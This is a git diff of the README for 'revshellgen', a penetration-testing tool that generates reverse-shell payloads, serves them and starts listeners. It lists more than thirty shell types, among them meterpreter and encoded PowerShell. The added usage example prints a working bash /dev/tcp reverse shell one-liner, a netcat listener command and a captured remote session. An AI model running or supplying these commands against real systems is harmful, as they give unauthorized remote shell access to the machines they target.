@@ -1,69 +1,85 @@
-# revshellgen
-Simple script to generate commands to achieve reverse shells. Thanks to DevoOverkill9 for the great idea!
+# Reverse Shell Generator
 
-![Screenshot](https://user-images.githubusercontent.com/45709553/54481816-b75ff180-4807-11e9-84db-17aadd39799c.PNG)
+Simple script to generate, server and listen for reverse shells.
+This is a fork of @cwinfosec revshellgen
 
 ## Usage
 
 ```
-revshellgen.py [-h] [-i IPADDR] [-p PORT] [-t SHELL_TYPE] [-l] [-a]
+usage: revshellgen [-h] [-i IPADDR] [-p PORT] [-t SHELL_TYPE] [-l] [-L] [-s]
 
-python revshellgen.py --help
+revshellgen -i 127.0.0.1 -p 4444 -t bash
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -i IPADDR, --ipaddr IPADDR
-                        IP address or interface to connect back to 
+                        IP address or interface to connect back to
   -p PORT, --port PORT  Port to connect back to
   -t SHELL_TYPE, --type SHELL_TYPE
                         Type of reverse shell to generate
   -l, --list            List available shell types
-  -a, --all             Generate all the shells!
+  -L, --listen          Start a listener
+  -s, --serve           Serve reverse shell
 ```
 
-### Shell Types:
+## Features
 
-- ASP: `asp`
-- AWK: `awk`
-- Bash: `bash`, `bash-2`, `bash-3`
-- Java: `java`
-- Java Server Page: `jsp`
-- Linux Binary: `lin-bin`
-- Lua: `lua`
-- Netcat (regular, mknod, & mkfifo variants): `nc`, `nc-c`, `nc-mkfifo`, `nc-mknod`, `nc-pipe`, `ncat`
-- Nodejs: `nodejs`
-- OSX Macho Binary: `osx-bin`
-- Perl: `perl`, `perl-2`, `perl-windows`
-- PHP: `php`, `php-2`, `php-3`, `php-4`, `php-5`
-- Powershell TCPClient: `ps-tcp`, 
-- Powershell IEX: `ps-iex`, `ps-b64`
-- Python: `python`, `python-2`
-- Ruby: `ruby`, `ruby-2`, `ruby-windows`
-- Socat (preferred for interactive sessions): `socat`
-- Tclsh: `tclsh`
-- Telnet: `telnet`, `telnet-mkfifo`
-- War: `war`
-- Windows Binary: `win-bin`
-- Xterm: `xterm`
-
-## Recommended Setup Steps
-
-For ease of use, it's recommended to add revshellgen to your path variable and give it executable permissions. 
+-   Automatically copy reverse shell into your clipboard using osc52
+-   Can start listeners automatically
+-   Can serve files on the web and copies download command to your clipboard
+-   Supports usage of interfaces and domains rather than IP addresses
 
 ```
-chmod +x /dir/to/revshellgen.py
-export PATH=$PATH:/dir/to/revshellgen
+❯  ./revshellgen -i eth0 -t bash -L
+[*] Generated reverse shell
+[+] Contents copied to clipboard
+bash -c "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1"
+
+[*] Start listener
+rlwrap -cAr nc -lvnp 4444
+
+[+] Listening on 4444
+Connection from 172.17.0.2:34572
+pwnpad@test:~/shared/revshellgen[pwnpad@test revshellgen]$ ls
+ls
+LICENSE
+README.md
+revshellgen
+pwnpad@test:~/shared/revshellgen[pwnpad@test revshellgen]$ Exiting.
 ```
 
-Alternatively, you can integrate it with other Kali tools by performing the following:
+### Shell Types
 
-```
-chmod +x /dir/to/revshellgen.py
-ln -s /dir/to/revshellgen.py /usr/bin/revshellgen
-```
-
-Keep in mind, this isn't ideal for systems with multiple users, and you should use root-privilege symbolic links with discretion. It's imperative that revshellgen.py is restricted from write access by untrusted users with this. 
-
-**Another Example:**
-
-![Screenshot](https://user-images.githubusercontent.com/45709553/54481815-b5962e00-4807-11e9-84a1-80c7901452c7.PNG)
+| Type      | Description                                        | Platform |
+| --------- | -------------------------------------------------- | -------- |
+| asp       | ASP stageless reverse shell                        | Windows  |
+| bash      | Bash reverse shell                                 | Linux    |
+| java      | Java reverse shell                                 | Linux    |
+| jsp       | JSP stageless reverse shell                        | Generic  |
+| lin       | Linux stageless reverse shell                      | Linux    |
+| lin32     | 32-bit Linux stageless reverse shell               | Linux    |
+| lin-met   | Linux stageless meterpreter reverse shell          | Linux    |
+| lin32-met | 32-bit Linux stageless meterpreter reverse shell   | Linux    |
+| nc        | Netcat reverse shell                               | Linux    |
+| nc-mkfifo | Netcat mkfifo reverse shell                        | Linux    |
+| nc-win    | Windows Netcat reverse shell                       | Windows  |
+| ncat      | Ncat reverse shell                                 | Linux    |
+| ncat-udp  | Ncat UDP reverse shell                             | Linux    |
+| ncat-win  | Windows Ncat reverse shell                         | Windows  |
+| node      | NodeJS reverse shell                               | Linux    |
+| perl      | Perl reverse shell                                 | Linux    |
+| perl-win  | Windows Perl reverse shell                         | Windows  |
+| php       | PHP reverse shell                                  | Generic  |
+| ps        | Powershell reverse shell                           | Windows  |
+| ps-b64    | Encoded Powershell reverse shell                   | Windows  |
+| py        | Python reverse shell                               | Linux    |
+| py-win    | Windows Python reverse shell                       | Windows  |
+| ruby      | Ruby reverse shell                                 | Linux    |
+| ruby-win  | Ruby reverse shell                                 | Windows  |
+| socat     | Socat reverse shell                                | Linux    |
+| telnet    | Telnet reverse shell                               | Linux    |
+| war       | War stageless reverse shell                        | Generic  |
+| win       | Windows stageless reverse shell                    | Windows  |
+| win32     | 32-bit Windows stageless reverse shell             | Windows  |
+| win-met   | Windows stageless meterpreter reverse shell        | Windows  |
+| win32-met | 32-bit Windows stageless meterpreter reverse shell | Windows  |
